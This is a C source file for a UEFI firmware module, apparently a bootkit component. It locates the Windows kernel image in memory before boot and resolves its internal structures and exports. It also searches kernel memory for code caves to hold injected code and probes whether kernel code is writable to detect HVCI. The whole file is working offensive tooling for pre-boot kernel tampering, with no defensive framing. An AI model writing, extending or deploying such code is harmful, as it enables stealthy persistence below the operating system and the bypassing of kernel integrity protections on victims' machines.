#include <Uefi.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <IndustryStandard/PeImage.h>
#include "othrys_types.h"

#define PE_SIGNATURE 0x00004550
#define DOS_SIGNATURE 0x5A4D
#define MAX_SCAN_RANGE 256

typedef struct {
    UINT64 Address;
    UINT64 Size;
} MEMORY_RANGE;

static MEMORY_RANGE gScanRanges[MAX_SCAN_RANGE];
static UINTN gScanRangeCount = 0;

static const UINT8 NtoskrnlString[] = {
    0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C,
    0x2E, 0x65, 0x78, 0x65
};

static BOOLEAN
IsNtoskrnlImage (
    UINT8  *ImageBase,
    UINT64  ImageSize
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr;
    EFI_IMAGE_NT_HEADERS64 *NtHdr;

    if (ImageSize < sizeof(EFI_IMAGE_DOS_HEADER) + sizeof(EFI_IMAGE_NT_HEADERS64))
        return FALSE;

    DosHdr = (EFI_IMAGE_DOS_HEADER *)ImageBase;
    if (DosHdr->e_magic != DOS_SIGNATURE) return FALSE;
    if ((UINT32)DosHdr->e_lfanew >= ImageSize) return FALSE;

    NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(ImageBase + DosHdr->e_lfanew);
    if (NtHdr->Signature != PE_SIGNATURE) return FALSE;
    if (NtHdr->OptionalHeader.Magic != EFI_IMAGE_NT_OPTIONAL_HDR64_MAGIC) return FALSE;

    if (ImageSize < 0x100000) return FALSE;

    UINT8 *SearchEnd = ImageBase + ImageSize - sizeof(NtoskrnlString);
    for (UINT8 *p = ImageBase; p < SearchEnd; p++) {
        if (CompareMem(p, NtoskrnlString, sizeof(NtoskrnlString)) == 0)
            return TRUE;
    }
    return FALSE;
}

VOID
CollectMemoryRanges (
    VOID
)
{
    EFI_STATUS Status;
    UINTN MemMapSize = 0;
    UINTN MapKey;
    UINTN DescSize;
    UINT32 DescVersion;
    EFI_MEMORY_DESCRIPTOR *MemMap;
    EFI_MEMORY_DESCRIPTOR *Desc;

    gScanRangeCount = 0;

    Status = gBS->GetMemoryMap(&MemMapSize, NULL, &MapKey, &DescSize, &DescVersion);
    if (Status != EFI_BUFFER_TOO_SMALL) return;

    MemMap = AllocatePool(MemMapSize + 2 * DescSize);
    if (!MemMap) return;

    Status = gBS->GetMemoryMap(&MemMapSize, MemMap, &MapKey, &DescSize, &DescVersion);
    if (EFI_ERROR(Status)) { FreePool(MemMap); return; }

    Desc = MemMap;
    while ((UINT8 *)Desc < (UINT8 *)MemMap + MemMapSize && gScanRangeCount < MAX_SCAN_RANGE) {
        if (Desc->Type == EfiBootServicesCode ||
            Desc->Type == EfiBootServicesData ||
            Desc->Type == EfiRuntimeServicesCode ||
            Desc->Type == EfiRuntimeServicesData ||
            Desc->Type == EfiLoaderCode ||
            Desc->Type == EfiLoaderData)
        {
            gScanRanges[gScanRangeCount].Address = Desc->PhysicalStart;
            gScanRanges[gScanRangeCount].Size = EFI_PAGES_TO_SIZE(Desc->NumberOfPages);
            gScanRangeCount++;
        }
        Desc = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)Desc + DescSize);
    }
    FreePool(MemMap);
}

UINT64
FindNtoskrnlBase (
    VOID
)
{
    CollectMemoryRanges();

    for (UINTN i = 0; i < gScanRangeCount; i++) {
        UINT64 Start = gScanRanges[i].Address;
        UINT64 End = Start + gScanRanges[i].Size;
        UINT64 Addr;

        if (gScanRanges[i].Size < 0x200000) continue;

        Addr = (Start + 0xFFF) & ~0xFFF;
        while (Addr + 0x1000 <= End) {
            if (*(UINT16 *)Addr == DOS_SIGNATURE) {
                UINT64 ImgSize = gScanRanges[i].Size - (Addr - Start);
                if (IsNtoskrnlImage((UINT8 *)Addr, ImgSize))
                    return Addr;
            }
            Addr += 0x1000;
        }
    }
    return 0;
}

UINT64
GetNtoskrnlSize (
    UINT64 NtoskrnlBase
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)NtoskrnlBase;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(NtoskrnlBase + DosHdr->e_lfanew);
    return NtHdr->OptionalHeader.SizeOfImage;
}

UINT64
GetNtoskrnlEntryPoint (
    UINT64 NtoskrnlBase
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)NtoskrnlBase;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(NtoskrnlBase + DosHdr->e_lfanew);
    return NtoskrnlBase + NtHdr->OptionalHeader.AddressOfEntryPoint;
}

UINT64
GetSectionVirtualAddress (
    UINT64 ImageBase,
    const CHAR8 *SectionName
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)ImageBase;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(ImageBase + DosHdr->e_lfanew);
    EFI_IMAGE_SECTION_HEADER *Sec = (EFI_IMAGE_SECTION_HEADER *)
        ((UINT8 *)NtHdr + sizeof(EFI_IMAGE_NT_HEADERS64));

    UINT16 NumSections = NtHdr->FileHeader.NumberOfSections;

    for (UINT16 i = 0; i < NumSections; i++) {
        if (CompareMem(Sec[i].Name, SectionName, 6) == 0) {
            return ImageBase + Sec[i].VirtualAddress;
        }
    }
    return 0;
}

UINT64
GetSectionVirtualSize (
    UINT64 ImageBase,
    const CHAR8 *SectionName
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)ImageBase;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(ImageBase + DosHdr->e_lfanew);
    EFI_IMAGE_SECTION_HEADER *Sec = (EFI_IMAGE_SECTION_HEADER *)
        ((UINT8 *)NtHdr + sizeof(EFI_IMAGE_NT_HEADERS64));

    UINT16 NumSections = NtHdr->FileHeader.NumberOfSections;

    for (UINT16 i = 0; i < NumSections; i++) {
        if (CompareMem(Sec[i].Name, SectionName, 6) == 0) {
            return Sec[i].Misc.VirtualSize;
        }
    }
    return 0;
}

VOID *
FindPattern (
    UINT8 *Base,
    UINT64 Size,
    UINT8 *Pattern,
    UINTN PatternSize
)
{
    if (Size < PatternSize) return NULL;
    for (UINT64 i = 0; i <= Size - PatternSize; i++) {
        if (CompareMem(Base + i, Pattern, PatternSize) == 0)
            return Base + i;
    }
    return NULL;
}

typedef struct {
    UINT8 Pattern[24];
    UINTN Length;
    INT32 RipOffset;
    INT32 RipAdjust;
} PATTERN_ENTRY;

static PATTERN_ENTRY KiSystemStartupPatterns[] = {
    {
        { 0x48, 0x89, 0x5C, 0x24, 0x08,
          0x48, 0x89, 0x74, 0x24, 0x10,
          0x57,
          0x48, 0x83, 0xEC, 0x30 },
        15, 0, 0
    },
    {
        { 0x48, 0x8B, 0xC4,
          0x48, 0x89, 0x58, 0x08,
          0x48, 0x89, 0x70, 0x10,
          0x57,
          0x48, 0x83, 0xEC, 0x20 },
        16, 0, 0
    },
    {
        { 0x48, 0x89, 0x5C, 0x24, 0x08,
          0x48, 0x89, 0x6C, 0x24, 0x10,
          0x48, 0x89, 0x74, 0x24, 0x18,
          0x57,
          0x41, 0x56,
          0x41, 0x57 },
        20, 0, 0
    }
};

UINT64
FindKiSystemStartup (
    UINT64 NtoskrnlBase
)
{
    UINT8 *Base = (UINT8 *)NtoskrnlBase;
    UINT64 Size = GetNtoskrnlSize(NtoskrnlBase);
    if (Size == 0) Size = 0x800000;

    for (UINTN i = 0; i < sizeof(KiSystemStartupPatterns) / sizeof(PATTERN_ENTRY); i++) {
        VOID *Found = FindPattern(Base, Size,
            KiSystemStartupPatterns[i].Pattern,
            KiSystemStartupPatterns[i].Length);
        if (Found) return (UINT64)Found;
    }

    return GetNtoskrnlEntryPoint(NtoskrnlBase);
}

static PATTERN_ENTRY PsLoadedModuleListPatterns[] = {
    { { 0x4C, 0x8B, 0x05 }, 3, 3, 7 },
    { { 0x48, 0x8B, 0x05 }, 3, 3, 7 },
    { { 0x4C, 0x8D, 0x05 }, 3, 3, 7 },
    { { 0x48, 0x8D, 0x05 }, 3, 3, 7 }
};

UINT64
FindPsLoadedModuleList (
    UINT64 NtoskrnlBase
)
{
    UINT8 *Base = (UINT8 *)NtoskrnlBase;
    UINT64 Size = GetNtoskrnlSize(NtoskrnlBase);
    if (Size == 0) Size = 0x800000;

    UINT64 DataStart = GetSectionVirtualAddress(NtoskrnlBase, ".data");
    UINT64 DataSize = GetSectionVirtualSize(NtoskrnlBase, ".data");

    if (DataStart == 0) return 0;

    for (UINT64 offset = 0; offset < Size - 7; offset++) {
        for (UINTN p = 0; p < 4; p++) {
            if (Base[offset] == PsLoadedModuleListPatterns[p].Pattern[0] &&
                Base[offset+1] == PsLoadedModuleListPatterns[p].Pattern[1] &&
                Base[offset+2] == PsLoadedModuleListPatterns[p].Pattern[2])
            {
                INT32 Disp = *(INT32 *)(Base + offset + 3);
                UINT64 Target = (UINT64)(Base + offset + 7) + Disp;

                if (Target >= DataStart && Target < DataStart + DataSize) {
                    UINT64 ListHead = *(UINT64 *)Target;
                    if (ListHead > 0xFFFF000000000000ULL && ListHead < 0xFFFFFFFFFFFF0000ULL) {

                        UINT64 Blink = *(UINT64 *)(ListHead + 8);
                        if (Blink > 0xFFFF000000000000ULL && Blink < 0xFFFFFFFFFFFF0000ULL) {
                            return ListHead;
                        }
                    }
                }
            }
        }
    }
    return 0;
}

typedef struct {
    UINT64 ExAllocatePool2;
    UINT64 ExAllocatePoolWithTag;
    UINT64 ExFreePoolWithTag;
    UINT64 PsLoadedModuleList;
    UINT64 PsSetLoadImageNotifyRoutine;
    UINT64 IoGetDeviceObjectPointer;
    UINT64 ObReferenceObjectByName;
    UINT64 KeGetEffectiveIrql;
    UINT64 KiSystemStartup;
    UINT64 NtoskrnlBase;
    UINT64 NtoskrnlSize;
} NTOSKRNL_OFFSETS;

UINT64
FindExportByName (
    UINT64 ImageBase,
    const CHAR8 *ExportName
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)ImageBase;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(ImageBase + DosHdr->e_lfanew);

    EFI_IMAGE_DATA_DIRECTORY *ExportDir =
        &NtHdr->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (ExportDir->Size == 0) return 0;

    EFI_IMAGE_EXPORT_DIRECTORY *Export =
        (EFI_IMAGE_EXPORT_DIRECTORY *)(ImageBase + ExportDir->VirtualAddress);

    UINT32 *NameRvas = (UINT32 *)(ImageBase + Export->AddressOfNames);
    UINT16 *Ordinals = (UINT16 *)(ImageBase + Export->AddressOfNameOrdinals);
    UINT32 *FuncRvas = (UINT32 *)(ImageBase + Export->AddressOfFunctions);

    for (UINT32 i = 0; i < Export->NumberOfNames; i++) {
        const CHAR8 *Name = (const CHAR8 *)(ImageBase + NameRvas[i]);
        UINTN j = 0;
        while (Name[j] && ExportName[j] && Name[j] == ExportName[j]) j++;
        if (Name[j] == 0 && ExportName[j] == 0) {
            UINT16 Ord = Ordinals[i];
            return ImageBase + FuncRvas[Ord];
        }
    }
    return 0;
}

NTSTATUS
ResolveNtoskrnlOffsets (
    NTOSKRNL_OFFSETS *Out
)
{
    if (!Out) return STATUS_INVALID_PARAMETER;

    SetMem(Out, sizeof(*Out), 0);

    Out->NtoskrnlBase = FindNtoskrnlBase();
    if (!Out->NtoskrnlBase) return STATUS_NOT_FOUND;

    Out->NtoskrnlSize = GetNtoskrnlSize(Out->NtoskrnlBase);

    Out->ExAllocatePool2 = FindExportByName(Out->NtoskrnlBase, "ExAllocatePool2");
    Out->ExAllocatePoolWithTag = FindExportByName(Out->NtoskrnlBase, "ExAllocatePoolWithTag");
    Out->ExFreePoolWithTag = FindExportByName(Out->NtoskrnlBase, "ExFreePoolWithTag");
    Out->PsSetLoadImageNotifyRoutine = FindExportByName(Out->NtoskrnlBase, "PsSetLoadImageNotifyRoutine");
    Out->IoGetDeviceObjectPointer = FindExportByName(Out->NtoskrnlBase, "IoGetDeviceObjectPointer");
    Out->ObReferenceObjectByName = FindExportByName(Out->NtoskrnlBase, "ObReferenceObjectByName");
    Out->KeGetEffectiveIrql = FindExportByName(Out->NtoskrnlBase, "KeGetEffectiveIrql");

    Out->KiSystemStartup = FindKiSystemStartup(Out->NtoskrnlBase);
    Out->PsLoadedModuleList = FindPsLoadedModuleList(Out->NtoskrnlBase);

    return STATUS_SUCCESS;
}

UINT64
FindCodeCave (
    UINT64 Base,
    UINT64 Size,
    UINTN RequiredSize
)
{
    UINT8 *Ptr = (UINT8 *)Base;
    UINTN Consecutive = 0;
    UINT64 CaveStart = 0;

    for (UINT64 i = 0; i < Size; i++) {
        if (Ptr[i] == 0xCC || Ptr[i] == 0x00) {
            if (Consecutive == 0) CaveStart = (UINT64)(Ptr + i);
            Consecutive++;
            if (Consecutive >= RequiredSize) return CaveStart;
        } else {
            Consecutive = 0;
        }
    }
    return 0;
}

BOOLEAN
TestCodeWritable (
    UINT64 Address
)
{
    volatile UINT8 *p = (volatile UINT8 *)Address;
    UINT8 Original = *p;
    UINT8 TestVal = Original ^ 0x01;

    *p = TestVal;
    UINT8 ReadBack = *p;
    *p = Original;

    return (ReadBack == TestVal);
}

BOOLEAN
DetectHvci (
    UINT64 NtoskrnlBase
)
{
    UINT64 TextStart = GetSectionVirtualAddress(NtoskrnlBase, ".text");
    UINT64 TextSize = GetSectionVirtualSize(NtoskrnlBase, ".text");

    if (TextStart == 0 || TextSize < 0x1000) return TRUE;

    if (!TestCodeWritable(TextStart + 0x100)) return TRUE;

    if (!TestCodeWritable(TextStart + TextSize / 2)) return TRUE;

    return FALSE;
}